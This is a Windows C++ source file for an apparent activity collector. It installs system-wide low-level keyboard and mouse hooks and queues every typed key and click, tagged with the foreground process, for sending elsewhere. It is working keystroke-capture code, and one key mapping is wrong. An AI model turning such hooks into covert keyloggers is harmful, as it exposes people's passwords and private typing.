#include "stdafx.h"
#include "thread_task_hook_keyandmouse.h"
#include "init_collector.h"
#include "global_enum_def.h"

bool HookKeyAndMouseThreadTask::_capsLock = false;
INT_WSTRING_MAP HookKeyAndMouseThreadTask::_key_translate_map;
HHOOK HookKeyAndMouseThreadTask::_hLLKeyboardHook = NULL;
HHOOK HookKeyAndMouseThreadTask::_hLLMouseHook = NULL;

HookKeyAndMouseThreadTask::HookKeyAndMouseThreadTask()
	: BaseThreadTask(HOOK_KEY_MOUSE_TASK_MODE)
{
	_capsLock = false;
}

HookKeyAndMouseThreadTask::~HookKeyAndMouseThreadTask()
{

}

void HookKeyAndMouseThreadTask::_InitKeyNameMap()
{
	_key_translate_map[0x5B] = wstring(L"LeftWindow");
	_key_translate_map[0x5C] = wstring(L"RightWindow");
	_key_translate_map[0x5D] = wstring(L"Application");
	_key_translate_map[0x90] = wstring(L"NUMLOCK");

	_key_translate_map[0x25] = wstring(L"LEFTARROW");
	_key_translate_map[0x26] = wstring(L"UPARROW");
	_key_translate_map[0x27] = wstring(L"RIGHTARROW");
	_key_translate_map[0x28] = wstring(L"RIGHTARROW");

	_key_translate_map[0x21] = wstring(L"PAGEUP");
	_key_translate_map[0x22] = wstring(L"PAGEDOWN");
	_key_translate_map[0x23] = wstring(L"END");
	_key_translate_map[0x24] = wstring(L"HOME");

	_key_translate_map[0x2C] = wstring(L"PRINTSCREEN ");
	_key_translate_map[0x2D] = wstring(L"INS");
	_key_translate_map[0x2E] = wstring(L"DEL");
}

BOOL HookKeyAndMouseThreadTask::CtrlHandlerForExit(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
		// Handle the CTRL-C signal. 
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		UnhookWindowsHookEx(_hLLKeyboardHook);
		UnhookWindowsHookEx(_hLLMouseHook);
#ifdef OUTPUT_COMMAND_LINE       
		cout << "remove hook";
#endif // OUTPUT_COMMAND_LINE;
		//getchar();
		return FALSE;
	default:
		return FALSE;
	}
}

//1
LRESULT CALLBACK HookKeyAndMouseThreadTask::StaticLowLevelMouseProc(INT nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION) 
	{
		if (wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_LBUTTONDOWN)
		{

			DWORD dwWndProcessId = 0;
			POINT curPoint = ((PMSLLHOOKSTRUCT)lParam)->pt;//to test;fix chips
			HWND hwndCurrent = WindowFromPoint(curPoint);
			GetWindowThreadProcessId(hwndCurrent, &dwWndProcessId);

			EventRecord* event_record = EventRecordManager::GetInstance().ParseMouseEvent(dwWndProcessId, wParam);
			InitCollector::GetCollector()->PushSendRecord((EventRecord*)event_record);
		}

	}

	return CallNextHookEx(_hLLMouseHook, nCode, wParam, 0);
}

LRESULT CALLBACK HookKeyAndMouseThreadTask::StaticLowLevelKeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) 
	{	
			DWORD input = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
		
			if (LLKHF_ALTDOWN & ((KBDLLHOOKSTRUCT *)lParam)->flags || (GetKeyState(VK_CONTROL) & 0x8000))  // Do not handle ALT+.../Ctrl+...  Hotkey
			{
				return CallNextHookEx(_hLLKeyboardHook, nCode, wParam, 0);
			}
		
			if ((GetKeyState(VK_LWIN) & 0x8000) || (GetKeyState(VK_RWIN) & 0x8000) || input == VK_LWIN || input == VK_RWIN) {  // do not handle Win+/Win HotKey
				return CallNextHookEx(_hLLKeyboardHook, nCode, wParam, 0);
			}
		
			bool shift_enter = false;
			if ((GetKeyState(VK_SHIFT) & 0x8000) && input != 0xA0 && input != 0xA1) //Shift+...Hotkey
				shift_enter = true;
		
			DWORD dwWndProcessId = 0;
			HWND hwndCurrent = GetForegroundWindow();
			GetWindowThreadProcessId(hwndCurrent, &dwWndProcessId);
		
			wstring keyname = L"";
			if (_key_translate_map.count(input) > 0) {
				keyname += _key_translate_map[input];
			}
			else
			{
				if (input == VK_CAPITAL) {  //turn capital or minuscules
					_capsLock = !_capsLock;
				}
		
				DWORD scanCode = ((KBDLLHOOKSTRUCT *)lParam)->scanCode;
				LONG lParamValue = (scanCode << 16);
				WCHAR name[1024] = { 0 };
				int result = GetKeyNameTextW(lParamValue, name, 1024);
				if (result > 0)
				{
					//std::wcout << name << endl; // Output: Caps Lock
					keyname = name;
					if (keyname.length() == 1 && keyname[0] <= 'Z' && keyname[0] >= 'A' && !_capsLock)
						for (auto &str : keyname)// turn lower
							str = ::towlower(str);
				}
			}
			if (shift_enter)
				keyname = L"Shift+" + keyname;
			EventRecord* event_record = EventRecordManager::GetInstance().ParseKeyboardEvent(dwWndProcessId, keyname);
			InitCollector::GetCollector()->PushSendRecord((EventRecord*)event_record);
		}
		
		return CallNextHookEx(_hLLKeyboardHook, nCode, wParam, 0);
}

void HookKeyAndMouseThreadTask::_Excute()
{
	if (SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandlerForExit, TRUE))
	{
#ifdef OUTPUT_COMMAND_LINE       
		cout << "setup hook" << endl;
#endif // OUTPUT_COMMAND_LINE;
		_capsLock = GetKeyState(VK_CAPITAL); // true is capital
		_hLLKeyboardHook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)StaticLowLevelKeyboardProc, GetModuleHandle(NULL), 0);
		_hLLMouseHook = (HHOOK)SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)StaticLowLevelMouseProc, GetModuleHandle(NULL), 0);
		
		//getchar();
		MSG msg;
		while (!_stop_flag && GetMessage(&msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		
		//cout << "Press any key to quit...";
		//getchar();
	}
	else
	{
#ifdef OUTPUT_COMMAND_LINE       
		cout << "Could not set control handler" << endl;
#endif // OUTPUT_COMMAND_LINE;
		//return 1;
	}
	//return 0;
}

void HookKeyAndMouseThreadTask::Log()
{

}

void HookKeyAndMouseThreadTask::Init()
{
	_InitKeyNameMap();
}